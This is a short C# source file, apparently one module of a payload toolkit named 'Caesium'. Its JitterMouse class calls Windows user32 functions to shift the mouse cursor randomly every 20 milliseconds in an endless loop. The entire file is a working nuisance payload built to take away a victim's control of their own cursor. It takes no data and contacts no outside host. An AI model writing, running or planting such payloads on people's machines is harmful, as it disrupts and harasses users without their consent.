using System.Runtime.InteropServices;

namespace Caesium.Payloads;

public abstract partial class JitterMouse : IPayload
{
    [LibraryImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool SetCursorPos(int x, int y);

    [LibraryImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool GetCursorPos(out Point lpPoint);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct Point { public int X; public int Y; }
    
    public static void Execute()
    {
        var random = new Random();
        while (true)
        {
            if (GetCursorPos(out var pos))
                SetCursorPos(pos.X + random.Next(-2, 3), pos.Y + random.Next(-2, 3));
            Thread.Sleep(20);
        }
    }
}